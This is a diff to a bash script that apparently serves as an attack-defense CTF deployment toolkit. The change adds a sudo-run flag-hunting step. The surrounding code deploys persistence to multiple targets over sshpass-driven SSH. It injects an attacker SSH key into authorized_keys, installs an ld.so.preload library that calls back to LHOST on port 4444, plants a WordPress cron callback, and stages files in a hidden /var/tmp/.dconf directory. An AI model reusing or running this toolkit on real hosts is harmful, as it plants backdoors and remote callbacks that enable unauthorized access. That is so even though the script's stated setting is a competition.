@@ -16,7 +16,8 @@ set -uo pipefail
 #       c. Inject SSH authorized_keys
 #       d. Install ld.so.preload           (callbacks -> LHOST)
 #       e. If tagged :wordpress — install wp_cron (callbacks -> LHOST)
-#       f. Clean up /var/tmp/.dconf/
+#       f. If HUNT_FLAGS=true — run flag_hunt.sh and print results
+#       g. Clean up /var/tmp/.dconf/
 #
 # Target tagging:
 #   Plain IP          — base mechanisms only (motd + ld_preload + ssh)
@@ -53,6 +54,10 @@ LPORT="4444"
 
 SSH_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdfRaX3m4g2IxRAU13/phGVXk4cZqcB0Y1FHCCaz4hW chris@kali"
 
+# Hunt for flags on each target during deployment.
+# Set to false when redeploying persistence mid-comp to skip the hunt.
+HUNT_FLAGS=true
+
 # ── END CONFIG ────────────────────────────────────────────────────────────────
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -69,6 +74,8 @@ BASE_TOOLKIT=(
 WP_TOOLKIT=(
     "${SCRIPT_DIR}/wp_cron.sh"
 )
+
+FLAG_HUNT_SCRIPT="${SCRIPT_DIR}/flag_hunt.sh"
 
 SO_FILE="${SCRIPT_DIR}/libdconf-update.so"
 
@@ -108,6 +115,11 @@ if ! command -v gcc &>/dev/null; then
     exit 1
 fi
 
+if [[ "$HUNT_FLAGS" == true && ! -f "$FLAG_HUNT_SCRIPT" ]]; then
+    warn "flag_hunt.sh not found at ${FLAG_HUNT_SCRIPT} — flag hunting will be skipped"
+    HUNT_FLAGS=false
+fi
+
 # ── SSH/SCP helpers ───────────────────────────────────────────────────────────
 
 SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"
@@ -119,7 +131,6 @@ run_ssh() {
 }
 
 run_ssh_sudo() {
-    # Run a command with sudo, feeding the password via stdin
     local target="$1"
     local cmd="$2"
     sshpass -p "$TARGET_PASS" ssh $SSH_OPTS "${TARGET_USER}@${target}" \
@@ -133,9 +144,6 @@ run_scp() {
 }
 
 # ── Step 1: Compile .so locally ───────────────────────────────────────────────
-#
-# The .so has LHOST baked in at compile time — compile once here
-# rather than per-target since the callback host is the same for all targets.
 
 info "Compiling ld.so.preload shared library (LHOST=${LHOST})..."
 
@@ -150,18 +158,17 @@ echo ""
 
 # ── Step 2: Deploy to each target ────────────────────────────────────────────
 
-# Track overall results for the final summary
 declare -A RESULT_MOTD
 declare -A RESULT_SSH
 declare -A RESULT_LDPRELOAD
 declare -A RESULT_WPCRON
+declare -A RESULT_FLAGS
 
 for ENTRY in "${TARGETS[@]}"; do
 
-    # Parse IP and optional service tags from entry (e.g. "10.10.10.104:wordpress")
     TARGET="${ENTRY%%:*}"
     TAGS="${ENTRY#*:}"
-    [[ "$TAGS" == "$TARGET" ]] && TAGS=""   # no colon = no tags
+    [[ "$TAGS" == "$TARGET" ]] && TAGS=""
 
     HAS_WORDPRESS=false
     [[ "$TAGS" == *"wordpress"* ]] && HAS_WORDPRESS=true
@@ -177,6 +184,7 @@ for ENTRY in "${TARGETS[@]}"; do
     TRANSFER_FILES=("${BASE_TOOLKIT[@]}")
     [[ -n "$SO_FILE" ]]            && TRANSFER_FILES+=("$SO_FILE")
     [[ "$HAS_WORDPRESS" == true ]] && TRANSFER_FILES+=("${WP_TOOLKIT[@]}")
+    [[ "$HUNT_FLAGS" == true ]]    && TRANSFER_FILES+=("$FLAG_HUNT_SCRIPT")
 
     if run_ssh "$TARGET" "mkdir -p ${REMOTE_DIR} && chmod 700 ${REMOTE_DIR}" && \
        run_scp "$TARGET" "${TRANSFER_FILES[@]}"; then
@@ -187,6 +195,7 @@ for ENTRY in "${TARGETS[@]}"; do
         RESULT_SSH[$TARGET]="SKIP"
         RESULT_LDPRELOAD[$TARGET]="SKIP"
         RESULT_WPCRON[$TARGET]="SKIP"
+        RESULT_FLAGS[$TARGET]="SKIP"
         echo ""
         continue
     fi
@@ -251,6 +260,29 @@ for ENTRY in "${TARGETS[@]}"; do
         RESULT_WPCRON[$TARGET]="N/A"
     fi
 
+    # ── Flag hunt ─────────────────────────────────────────────────────────
+
+    if [[ "$HUNT_FLAGS" == true ]]; then
+        info "[${TARGET}] Hunting for flags..."
+        echo ""
+        echo "  >>>>>>>>>> FLAGS FROM ${TARGET} <<<<<<<<<<"
+        echo ""
+
+        FLAG_OUTPUT=$(run_ssh_sudo "$TARGET" \
+            "bash ${REMOTE_DIR}/flag_hunt.sh" 2>/dev/null)
+
+        FLAG_COUNT=$(echo "$FLAG_OUTPUT" | grep -c "FLAG FOUND" || true)
+
+        echo "$FLAG_OUTPUT"
+        echo ""
+        echo "  >>>>>>>>>> END FLAGS FROM ${TARGET} <<<<<<<<<<"
+        echo ""
+
+        RESULT_FLAGS[$TARGET]="${FLAG_COUNT} found"
+    else
+        RESULT_FLAGS[$TARGET]="SKIPPED"
+    fi
+
     # ── Cleanup ───────────────────────────────────────────────────────────
 
     info "[${TARGET}] Cleaning up ${REMOTE_DIR}..."
@@ -269,16 +301,17 @@ done
 echo "============================================================"
 success "Deployment complete — Summary"
 echo "============================================================"
-printf "%-18s %-8s %-8s %-12s %-8s\n" "TARGET" "MOTD" "SSH" "LD_PRELOAD" "WP_CRON"
-echo "------------------------------------------------------------"
+printf "%-18s %-8s %-8s %-12s %-10s %-12s\n" "TARGET" "MOTD" "SSH" "LD_PRELOAD" "WP_CRON" "FLAGS"
+echo "--------------------------------------------------------------------"
 for ENTRY in "${TARGETS[@]}"; do
     TARGET="${ENTRY%%:*}"
-    printf "%-18s %-8s %-8s %-12s %-8s\n" \
+    printf "%-18s %-8s %-8s %-12s %-10s %-12s\n" \
         "$TARGET" \
         "${RESULT_MOTD[$TARGET]:-?}" \
         "${RESULT_SSH[$TARGET]:-?}" \
         "${RESULT_LDPRELOAD[$TARGET]:-?}" \
-        "${RESULT_WPCRON[$TARGET]:-?}"
+        "${RESULT_WPCRON[$TARGET]:-?}" \
+        "${RESULT_FLAGS[$TARGET]:-?}"
 done
 echo "============================================================"
 echo ""
